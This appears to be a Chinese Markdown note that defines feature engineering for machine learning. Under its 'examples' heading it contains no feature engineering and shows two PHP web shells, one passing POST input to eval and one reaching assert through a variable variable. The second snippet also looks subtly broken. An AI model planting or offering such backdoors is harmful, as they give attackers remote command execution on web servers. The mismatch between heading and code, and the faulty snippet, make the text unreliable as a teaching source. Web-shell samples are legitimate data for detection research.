# 特征工程

## 什么是特征工程

特征工程的目标是从原始数据中提取出有用的特征，转变成数学符号，也就是矩阵，以便让机器学习算法更好地理解数据。

## 特征工程实例

```php
<?php  
function fun($a){  
    @eval($a);  
}  
@fun($_POST['shell']);  
?>

<?php
$bb="assert";
$a='bb';
$$aa($_POST['shell']);
?>
```
